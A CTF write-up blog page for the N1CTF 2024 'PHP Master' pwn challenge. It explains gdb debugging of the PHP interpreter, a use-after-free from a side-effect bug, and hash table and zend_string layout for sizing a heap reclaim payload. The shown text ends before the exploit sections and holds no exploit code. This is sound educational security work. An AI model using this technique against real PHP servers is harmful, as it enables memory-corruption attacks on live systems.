<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="PHP Master Writeup How to debug the challenge? There are plenty of user functions in the interpreter, those mathematic functions can be very useful since the paramters are relatively simpler than othe">
<meta property="og:type" content="article">
<meta property="og:title" content="Save Me! Web Master: Pwn N1CTF 2024 PHP Master">
<meta property="og:url" content="https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/index.html">
<meta property="og:site_name">
<meta property="og:description" content="PHP Master Writeup How to debug the challenge? There are plenty of user functions in the interpreter, those mathematic functions can be very useful since the paramters are relatively simpler than othe">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/image-20241112082253668.png">
<meta property="og:image" content="https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/image-20241112082313241.png">
<meta property="article:published_time" content="2024-11-15T15:05:26.000Z">
<meta property="article:modified_time" content="2024-11-15T15:12:36.110Z">
<meta property="article:author" content="Xia0o0o0o">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="Interpreter">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/image-20241112082253668.png">
    
    
      
        
          <link rel="shortcut icon" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
      
        
          <link rel="icon" type="image/png" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="../../../../https:/avatars.githubusercontent.com/u/22996989?s=400&amp;u=18dec832f23e8e1d9f7097245cd5b955990979b8&amp;v=4">
        
      
    
    <!-- title -->
    <title>Save Me! Web Master: Pwn N1CTF 2024 PHP Master</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="../../../../css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="atom.xml" title="" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
      <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Home
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../index.html">
                Home
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Writing
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>
              <a style="padding-left: 9px;" href="../../../../archives/">
                Writing
              </a>
          </span>
        </li>
        <!--
           -->
        <li>
          <span style="display: flex; align-items: center;">
            <title>
              Projects
            </title>
            <svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>
              <a style="padding-left: 9px;" href="../../../../https:/github.com/KpwnZ">
                Projects
              </a>
          </span>
        </li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="../../../10/27/SpiderMonkey-Internal/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&text=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&is_video=false&description=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Save Me! Web Master: Pwn N1CTF 2024 PHP Master&body=Check out this article: https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&title=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&name=Save Me! Web Master: Pwn N1CTF 2024 PHP Master&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2024/11/15/Save-Me-Web-Master-Pwn-N1CTF-2024-PHP-Master/&t=Save Me! Web Master: Pwn N1CTF 2024 PHP Master"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">PHP Master Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-debug-the-challenge"><span class="toc-number">1.1.</span> <span class="toc-text">How to debug the challenge?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Control-the-hash-table"><span class="toc-number">1.3.</span> <span class="toc-text">Control the hash table</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Leak-something-first"><span class="toc-number">1.3.1.</span> <span class="toc-text">Leak something first</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#One-punch-leak-more"><span class="toc-number">1.3.2.</span> <span class="toc-text">One punch, leak more</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-failure"><span class="toc-number">1.4.1.</span> <span class="toc-text">A failure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-master-came-to-rescue"><span class="toc-number">1.4.2.</span> <span class="toc-text">Web master came to rescue</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Save Me! Web Master: Pwn N1CTF 2024 PHP Master
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Xia0o0o0o</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-11-15T15:05:26.000Z" class="dt-published" itemprop="datePublished">2024-11-15</time>
        
      
    </div>


      

      
    <div class="article-tag" style="text-decoration: none;">
        <i class="fa-solid fa-tag"></i>
        <a class="tag-category" href="../../../../tags/CTF/" rel="tag">CTF</a> <a class="tag-category" href="../../../../tags/Interpreter/" rel="tag">Interpreter</a> <a class="tag-category" href="../../../../tags/PHP/" rel="tag">PHP</a> <a class="tag-category" href="../../../../tags/PWN/" rel="tag">PWN</a> <a class="tag-category" href="../../../../tags/Writeup/" rel="tag">Writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1>PHP Master Writeup</h1>
<h2 id="How-to-debug-the-challenge">How to debug the challenge?</h2>
<p>There are plenty of user functions in the interpreter, those mathematic functions can be very useful since the paramters are relatively simpler than other functions.</p>
<p>Let’s take <code>zif_tan</code> as an example</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PHP_FUNCTION</span>(tan)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">double</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ZEND_PARSE_PARAMETERS_START</span>(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">Z_PARAM_DOUBLE</span>(num)</span><br><span class="line">    <span class="built_in">ZEND_PARSE_PARAMETERS_END</span>();</span><br><span class="line">    <span class="built_in">RETURN_DOUBLE</span>(<span class="built_in">tan</span>(num));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>and the corresponding assembly code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  0x55fe29015ec0 &lt;zif_tan+0010&gt;   jne    0x55fe28e1698c &lt;zif_tan.cold&gt;</span><br><span class="line">→ 0x55fe29015ec6 &lt;zif_tan+0016&gt;   cmp    BYTE PTR [rdi+0x58], 0x5</span><br><span class="line">  0x55fe29015eca &lt;zif_tan+001a&gt;   mov    rbp, rsi</span><br></pre></td></tr></table></figure>
<p>the <code>$rdi+0x50</code> points to the <code>zval</code> structure.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *(*(zval *)($rdi+0x50)).value.arr</span><br><span class="line">$28 = &#123;</span><br><span class="line">  gc = &#123;</span><br><span class="line">    refcount = 0x2,</span><br><span class="line">    u = &#123;</span><br><span class="line">      type_info = 0x7</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  u = &#123;</span><br><span class="line">    v = &#123;</span><br><span class="line">      flags = 0x10,</span><br><span class="line">      _unused = 0x0,</span><br><span class="line">      nIteratorsCount = 0x0,</span><br><span class="line">      _unused2 = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    flags = 0x10</span><br><span class="line">  &#125;,</span><br><span class="line">  nTableMask = 0xfffffff0,</span><br><span class="line">  &#123;</span><br><span class="line">    arHash = 0x7fc00d46f980,</span><br><span class="line">    arData = 0x7fc00d46f980,</span><br><span class="line">    arPacked = 0x7fc00d46f980</span><br><span class="line">  &#125;,</span><br><span class="line">  nNumUsed = 0x8,</span><br><span class="line">  nNumOfElements = 0x8,</span><br><span class="line">  nTableSize = 0x8,</span><br><span class="line">  nInternalPointer = 0x0,</span><br><span class="line">  nNextFreeElement = 0x8,</span><br><span class="line">  pDestructor = 0x55fe290d0780 &lt;zval_ptr_dtor&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p *(*(zval *)($rdi+0x50)).value.arr-&gt;arData</span><br><span class="line">$29 = &#123;</span><br><span class="line">  val = &#123;</span><br><span class="line">    value = &#123;</span><br><span class="line">      lval = 0x7fc00d4aa8c0,</span><br><span class="line">      dval = 6.9397860522723038e-310,</span><br><span class="line">      counted = 0x7fc00d4aa8c0,</span><br><span class="line">      str = 0x7fc00d4aa8c0,</span><br><span class="line">      arr = 0x7fc00d4aa8c0,</span><br><span class="line">      obj = 0x7fc00d4aa8c0,</span><br><span class="line">      res = 0x7fc00d4aa8c0,</span><br><span class="line">      ref = 0x7fc00d4aa8c0,</span><br><span class="line">      ast = 0x7fc00d4aa8c0,</span><br><span class="line">      zv = 0x7fc00d4aa8c0,</span><br><span class="line">      ptr = 0x7fc00d4aa8c0,</span><br><span class="line">      ce = 0x7fc00d4aa8c0,</span><br><span class="line">      func = 0x7fc00d4aa8c0,</span><br><span class="line">      ww = &#123;</span><br><span class="line">        w1 = 0xd4aa8c0,</span><br><span class="line">        w2 = 0x7fc0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    u1 = &#123;</span><br><span class="line">      type_info = 0x106,</span><br><span class="line">      v = &#123;</span><br><span class="line">        type = 0x6,</span><br><span class="line">        type_flags = 0x1,</span><br><span class="line">        u = &#123;</span><br><span class="line">          extra = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    u2 = &#123;</span><br><span class="line">      next = 0xffffffff,</span><br><span class="line">      cache_slot = 0xffffffff,</span><br><span class="line">      opline_num = 0xffffffff,</span><br><span class="line">      lineno = 0xffffffff,</span><br><span class="line">      num_args = 0xffffffff,</span><br><span class="line">      fe_pos = 0xffffffff,</span><br><span class="line">      fe_iter_idx = 0xffffffff,</span><br><span class="line">      guard = 0xffffffff,</span><br><span class="line">      constant_flags = 0xffffffff,</span><br><span class="line">      extra = 0xffffffff</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  h = 0x0,</span><br><span class="line">  key = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p *(*(zval *)($rdi+0x50)).value.arr-&gt;arPacked</span><br><span class="line">$148 = &#123;</span><br><span class="line">  value = &#123;</span><br><span class="line">    lval = 0x7fc00d4aa8c0,</span><br><span class="line">    dval = 6.9397860522723038e-310,</span><br><span class="line">    counted = 0x7fc00d4aa8c0,</span><br><span class="line">    str = 0x7fc00d4aa8c0,</span><br><span class="line">    arr = 0x7fc00d4aa8c0,</span><br><span class="line">    obj = 0x7fc00d4aa8c0,</span><br><span class="line">    res = 0x7fc00d4aa8c0,</span><br><span class="line">    ref = 0x7fc00d4aa8c0,</span><br><span class="line">    ast = 0x7fc00d4aa8c0,</span><br><span class="line">    zv = 0x7fc00d4aa8c0,</span><br><span class="line">    ptr = 0x7fc00d4aa8c0,</span><br><span class="line">    ce = 0x7fc00d4aa8c0,</span><br><span class="line">    func = 0x7fc00d4aa8c0,</span><br><span class="line">    ww = &#123;</span><br><span class="line">      w1 = 0xd4aa8c0,</span><br><span class="line">      w2 = 0x7fc0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  u1 = &#123;</span><br><span class="line">    type_info = 0x106,</span><br><span class="line">    v = &#123;</span><br><span class="line">      type = 0x6,</span><br><span class="line">      type_flags = 0x1,</span><br><span class="line">      u = &#123;</span><br><span class="line">        extra = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  u2 = &#123;</span><br><span class="line">    next = 0xffffffff,</span><br><span class="line">    cache_slot = 0xffffffff,</span><br><span class="line">    opline_num = 0xffffffff,</span><br><span class="line">    lineno = 0xffffffff,</span><br><span class="line">    num_args = 0xffffffff,</span><br><span class="line">    fe_pos = 0xffffffff,</span><br><span class="line">    fe_iter_idx = 0xffffffff,</span><br><span class="line">    guard = 0xffffffff,</span><br><span class="line">    constant_flags = 0xffffffff,</span><br><span class="line">    extra = 0xffffffff</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Vulnerability">Vulnerability?</h2>
<p>The vulnerability is rooted in the implemenetation of PHP interpreter <a target="_blank" rel="noopener" href="https://github.com/php/php-src/issues/13754">https://github.com/php/php-src/issues/13754</a>. Side effect bug is notorius in interpreter of various languages. When <code>$this-&gt;prev_data</code> is assigned to <code>$this-&gt;data</code>, the reference count of <code>$this-&gt;data</code> will be decreased and the object will be released. Meanwhile, in <code>DataForm::get()</code> and <code>DataForm::append()</code>, <code>$this-&gt;data</code> has been fetched already which turn this typical side effect problem into a UaF vulnerability.</p>
<h2 id="Control-the-hash-table">Control the hash table</h2>
<p>The memory layout of hash table is well documented in PHP source code as below</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * HashTable Data Layout</span><br><span class="line"> * =====================</span><br><span class="line"> *</span><br><span class="line"> *                 +=============================+</span><br><span class="line"> *                 | HT_HASH(ht, ht-&gt;nTableMask) |                   +=============================+</span><br><span class="line"> *                 | ...                         |                   | HT_INVALID_IDX              |</span><br><span class="line"> *                 | HT_HASH(ht, -1)             |                   | HT_INVALID_IDX              |</span><br><span class="line"> *                 +-----------------------------+                   +-----------------------------+</span><br><span class="line"> * ht-&gt;arData ---&gt; | Bucket[0]                   | ht-&gt;arPacked ---&gt; | ZVAL[0]                     |</span><br><span class="line"> *                 | ...                         |                   | ...                         |</span><br><span class="line"> *                 | Bucket[ht-&gt;nTableSize-1]    |                   | ZVAL[ht-&gt;nTableSize-1]      |</span><br><span class="line"> *                 +=============================+                   +=============================+</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
<p>So, for a hash table which has nTableMask = 0xfffffff0, there will be 16 <code>HT_HASH</code> entries with 4 * 16 bytes.<br>
And for a hash table with 8 elements, there will be 8 <code>Bucket</code> entries with 32 * 8 bytes. So to reclaim the UaF’ed <code>arData</code>, we need to allocate 320 bytes.</p>
<p>Note that the data of <code>zend_string</code> is stored inline. According to the source code of <code>zend_string</code> allocation</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zend_always_inline zend_string *<span class="title">zend_string_alloc</span><span class="params">(<span class="keyword">size_t</span> len, <span class="keyword">bool</span> persistent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	zend_string *ret = (zend_string *)<span class="built_in">pemalloc</span>(<span class="built_in">ZEND_MM_ALIGNED_SIZE</span>(_ZSTR_STRUCT_SIZE(len)), persistent);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">GC_SET_REFCOUNT</span>(ret, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">GC_TYPE_INFO</span>(ret) = GC_STRING | ((persistent ? IS_STR_PERSISTENT : <span class="number">0</span>) &lt;&lt; GC_FLAGS_SHIFT);</span><br><span class="line">	<span class="built_in">ZSTR_H</span>(ret) = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">ZSTR_LEN</span>(ret) = len;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_MM_ALIGNMENT_MASK ~(ZEND_MM_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_MM_ALIGNED_SIZE(size)	(((size) + ZEND_MM_ALIGNMENT - 1) &amp; ZEND_MM_ALIGNMENT_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ZSTR_HEADER_SIZE XtOffsetOf(zend_string, val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ZSTR_STRUCT_SIZE(len) (_ZSTR_HEADER_SIZE + len + 1)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Our payload should be 320 - 0x18 - 0x1 bytes.</p>
